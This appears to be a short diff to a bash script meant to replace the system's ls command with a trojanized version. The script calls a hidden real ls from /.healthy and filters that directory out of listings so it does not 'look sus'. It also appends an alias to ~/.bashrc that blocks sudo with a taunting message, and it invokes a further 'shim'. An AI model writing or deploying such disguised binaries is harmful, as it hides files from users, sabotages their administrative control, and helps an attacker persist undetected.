@@ -1,6 +1,12 @@
 #!/bin/bash
+#will be in /bin/ls
 
+#calls the healthy one to not look sus
 /.healthy/ls $@ | grep -v .healthy
+
+#dont let them sudo
 echo 'alias sudo="echo 'Oops you\'re too slow!'"' >> ~/.bashrc
 source ~/.bashrc
+
+#call shim
 /bin/list
